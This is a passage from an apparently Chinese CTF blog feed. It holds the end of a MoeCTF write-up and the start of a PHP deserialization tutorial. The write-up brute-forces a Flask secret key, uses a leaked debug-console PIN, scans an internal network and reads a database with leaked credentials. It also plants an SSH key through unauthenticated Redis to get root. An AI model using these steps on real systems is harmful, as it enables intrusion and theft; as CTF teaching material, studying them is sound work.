punctuation">(</span>app<span class="token punctuation">)</span><span class="token keyword">return</span> s<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>session_cookie_value<span class="token punctuation">)</span>cookie <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> c <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">,</span> repeat<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>k <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>decode<span class="token punctuation">(</span>cookie<span class="token punctuation">,</span> <span class="token string">"This-random-secretKey-you-can't-get"</span><span class="token operator">+</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span><span class="token keyword">pass</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token keyword">break</span></code></pre><p>secret key是<code>This-random-secretKey-you-can&#39;t-get06f0</code>,有了secret key就能自己修改session为admin。admin的private留言说pin码904-474-531，所以去到<a href="http://47.115.201.35:8000/console">http://47.115.201.35:8000/console</a> ，输入pin码则获得console</p><p>执行系统命令：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> subprocesssubprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'ls'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'cat'</span><span class="token punctuation">,</span><span class="token string">'/flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>获得第一部分flag：<code>moectf&#123;Information-leakage-Is-dangerous!</code></p><p>还有个readme，python decode后看到提示</p><pre class="language-none"><code class="language-none">恭喜你通过外网渗透拿下了本台服务器的权限接下来，你需要尝试内网渗透，本服务器的&#x2F;app&#x2F;tools目录下内置了fscan你需要了解它的基本用法，然后扫描内网的ip段如果你进行了正确的操作，会得到类似下面的结果10.1.11.11:22 open10.1.23.21:8080 open10.1.23.23:9000 open将你得到的若干个端口号从小到大排序并以 - 分割，这一串即为hint.zip压缩包的密码（本例中，密码为：22-8080-9000）注意：请忽略掉xx.xx.xx.1，例如扫出三个ip 192.168.0.1 192.168.0.2 192.168.0.3 ，请忽略掉有关192.168.0.1的所有结果！此为出题人服务器上的其它正常服务对密码有疑问随时咨询出题人</code></pre><p>提示用fscan，看一下help</p><pre class="language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">"/app/tools/fscan --help"</span><span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>是这个工具： <a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><p>看一下本机内网ip, 参考 <a href="https://blog.csdn.net/kuanggudejimo/article/details/99454185">https://blog.csdn.net/kuanggudejimo/article/details/99454185</a></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token punctuation">;</span>s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_DGRAM<span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'8.8.8.8'</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ip <span class="token operator">=</span> s<span class="token punctuation">.</span>getsockname<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span></code></pre><p>得到ip为<code>172.21.0.2</code>。扫描：</p><pre class="language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">"/app/tools/fscan -h 127.21.0.2/24"</span><span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>得到hint.zip密码： 22-3306-6379-8080</p><p>然后不要卡在怎么配置frp进行内网穿透，那个要自己开vps，或者要有个自己的公网ip。穿透只是辅助效果，帮助我们渗透更加方便，不配置直接用python console也是可以的。也不要想用ngrok免费版，免费版只能转发一个端口，而穿透至少要两个端口。直接去搞mysql：</p><pre class="language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">"cat dataSql.py"</span><span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>得到sql数据库交互的源码，里面有用户名和密码。连接:</p><pre class="language-python" data-language="python"><code class="language-python">db <span class="token operator">=</span> pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"mysql"</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">3306</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">"root"</span><span class="token punctuation">,</span>passwd<span class="token operator">=</span><span class="token string">"The_P0sswOrD_Y0u_Nev3r_Kn0w"</span><span class="token punctuation">,</span>database<span class="token operator">=</span><span class="token string">"messageboard"</span><span class="token punctuation">,</span>charset<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span></code></pre><p>查内容：</p><pre class="language-python" data-language="python"><code class="language-python">cursor<span class="token operator">=</span>db<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select database()"</span><span class="token punctuation">)</span>cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'messageboard'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select(group_concat(table_name))from(information_schema.tables)where(table_schema)='messageboard'"</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'flag,message,users'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')"</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select(group_concat(flag))from(flag)"</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'-Are-YOu-myS0L-MasT3r?-'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>最后是redis。用python装个redis模块（不知道为啥apt-get install装不了？）：</p><pre class="language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">"pip3 install redis"</span><span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>然后连接</p><pre class="language-python" data-language="python"><code class="language-python">r <span class="token operator">=</span> redis<span class="token punctuation">.</span>Redis<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'172.20.0.3'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">6379</span><span class="token punctuation">,</span> db<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>从info中得知redis存在未授权访问漏洞。根据 https:&#x2F;&#x2F;_thorns.gitbooks.io&#x2F;sec&#x2F;content&#x2F;redis_getshellzi_dong_hua_shi_jian_zhi_ssh_key.html 往root写ssh key。public_key和privkey利用<code>ssh-keygen -t rsa</code>生成</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'aaaaaaaaaa'</span><span class="token punctuation">,</span> <span class="token string">'\n\n'</span> <span class="token operator">+</span> public_key <span class="token operator">+</span> <span class="token string">'\n\n'</span><span class="token punctuation">)</span><span class="token boolean">True</span><span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span>config_set<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">,</span> <span class="token string">'/root/.ssh'</span><span class="token punctuation">)</span><span class="token boolean">True</span><span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span>config_set<span class="token punctuation">(</span><span class="token string">'dbfilename'</span><span class="token punctuation">,</span> <span class="token string">'authorized_keys'</span><span class="token punctuation">)</span><span class="token boolean">True</span><span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token boolean">True</span></code></pre><p>参考 <a href="https://www.cnblogs.com/wongbingming/articles/12384764.html">https://www.cnblogs.com/wongbingming/articles/12384764.html</a> ，安装paramiko进行ssh连接</p><pre class="language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">"pip3 install paramiko"</span><span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">import</span> paramiko<span class="token operator">>></span><span class="token operator">></span> pkey <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>RSAKey<span class="token punctuation">.</span>from_private_key_file<span class="token punctuation">(</span><span class="token string">'privkey'</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> trans <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>Transport<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'172.20.0.3'</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> trans<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>username<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span> pkey<span class="token operator">=</span>pkey<span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> ssh <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>SSHClient<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> ssh<span class="token punctuation">.</span>_transport <span class="token operator">=</span> trans<span class="token operator">>></span><span class="token operator">></span> stdin<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr <span class="token operator">=</span> ssh<span class="token punctuation">.</span>exec_command<span class="token punctuation">(</span><span class="token string">'ls /'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> stdin<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr <span class="token operator">=</span> ssh<span class="token punctuation">.</span>exec_command<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p> <strong>Flag</strong></p><blockquote><p>moectf{Information-leakage-Is-dangerous!-Are-YOu-myS0L-MasT3r?-P@sSW0Rd-F0r-redis-Is-NeceSsary}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> http </tag>
            
            <tag> MoeCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web入门-php_unserialize</title>
      <link href="/2024/07/13/web%E5%85%A5%E9%97%A8-php_unserialize/"/>
      <url>/2024/07/13/web%E5%85%A5%E9%97%A8-php_unserialize/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><a href="https://hello-ctf.com/HC_Web/php_unser_base/">PHP 序列化及反序列化基础</a></p><p><a href="https://blog.csdn.net/jayq1/article/details/131858372">反序列化学习笔记</a></p><p><a href="https://blog.csdn.net/solitudi/article/details/113588692">[CTF]PHP反序列化总结</a></p><h4 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h4><p>在 PHP 的序列化中，魔术方法（Magic Methods）是一组特殊的方法，这些方法以双下划线（<code>__</code>）作为前缀，可以在特定的序列化阶段触发从而使开发者能够进一步的控制 序列化 &#x2F; 反序列化 的过程。</p><p>你可以在 PHP 官方文档中查找到对应魔术方法的定义和使用方法：<a href="https://www.php.net/manual/zh/language.oop5.magic.php">PHP: 魔术方法 - Manual</a></p><p>一般在题目中常见的几个方法如下：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//------ 执行unserialize()时，先会调用这个函数</span><span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//------- 执行serialize()时，先会调用这个函数</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//---- 对象被销毁时触发</span><span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//-------- 在对象上下文中调用不可访问的方法时触发</span><span class="token function">__callStatic</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//-- 在静态上下文中调用不可访问的方法时触发</span><span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//--------- 用于从不可访问的属性读取数据或者不存在这个键都会调用此法</span><span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//--------- 用于将数据写入不可访问的属性</span><span class="token function">__isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//------- 在不可访问的属性上调用isset()或empty()触发</span><span class="token function">__unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//------- 在不可访问的属性上使用unset()时触发</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//---- 把类当作字符串使用时触发</span><span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//------ 当尝试将对象调用为函数时触发</span></code></pre><p>一份比较全面的表格：</p><table><thead><tr><th align="left">magicMethods</th><th align="left">attribute</th></tr></thead><tbody><tr><td align="left">__construct</td><td align="left">当一个对象被创建时自动调用这个方法，可以用来初始化对象的属性。</td></tr><tr><td align="left">__destruct</td><td align="left">当一个对象被销毁时自动调用这个方法，可以用来释放对象占用的资源。</td></tr><tr><td align="left">__call</td><td align="left">在对象中调用一个不存在的方法时自动调用这个方法，可以用来实现动态方法调用。</td></tr><tr><td align="left">__callStatic</td><td align="left">在静态上下文中调用一个不存在的方法时自动调用这个方法，可以用来实现动态静态方法调用。</td></tr><tr><td align="left">__get</td><td align="left">当一个对象的属性被读取时自动调用这个方法，可以用来实现属性的访问控制。</td></tr><tr><td align="left">__set</td><td align="left">当一个对象的属性被设置时自动调用这个方法，可以用来实现属性的访问控制。</td></tr><tr><td align="left">__isset</td><td align="left">当使用 isset() 或 empty() 测试一个对象的属性时自动调用这个方法，可以用来实现属性的访问控制。</td></tr><tr><td align="left">__unset</td><td align="left">当使用 unset() 删除一个对象的属性时自动调用这个方法，可以用来实现属性的访问控制。</td></tr><tr><td align="left">__toString</td><td align="left">当一个对象被转换为字符串时自动调用这个方法，可以用来实现对象的字符串表示。</td></tr><tr><td align="left">__invoke</td><td align="left">当一个对象被作为函数调用时自动调用这个方法，可以用来实现对象的可调用性。</td></tr><tr><td align="left">__set_state</td><td align="left">当使用 var_export() 导出一个对象时自动调用这个方法，可以用来实现对象的序列化和反序列化。</td></tr><tr><td align="left">__clone</td><td align="left">当一个对象被克隆时自动调用这个方法，可以用来实现对象的克隆。</td></tr><tr><td align="left">__debugInfo</td><td align="left">当使用 var_dump() 或 print_r() 输出一个对象时自动调用这个方法，可以用来控制对象的调试信息输出。</td></tr><tr><td align="left">__sleep</td><td align="left">在对象被序列化之前自动调用这个方法，可以用来控制哪些属性被序列化。</td></tr><tr><td align="left">__wakeup</td><td align="left">在对象被反序列化之后自动调用这个方法，可以用来重新初始化对象的属性。</td></tr></tbody></table><p>PHP 官方文档已经很详细了，这里不在赘述，不一定需要学会所有的函数，除开常见的，其他的在遇到的时候查阅即可。</p><h3 id="web254-278"><a href="#web254-278" class="headerlink" title="web254-278"></a>web254-278</h3><h4 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>只要触发**vipOneKeyGetFlag()**函数就可以得到flag</p><p>考察基础的代码审计，满足<code>$this-&gt;username===$u&amp;&amp;$this-&gt;password===$p</code>即可</p><h4 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>与上题不同的是这次的<code>$user</code>是由cookie的user变量反序列化得到的，考察了基本的反序列化</p><p>要求 cookie 中 user 值为一个序列化的 ctfshowUser 对象，属性 isVip 值为 true，username 和 password 和 GET 参数获取的一致。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    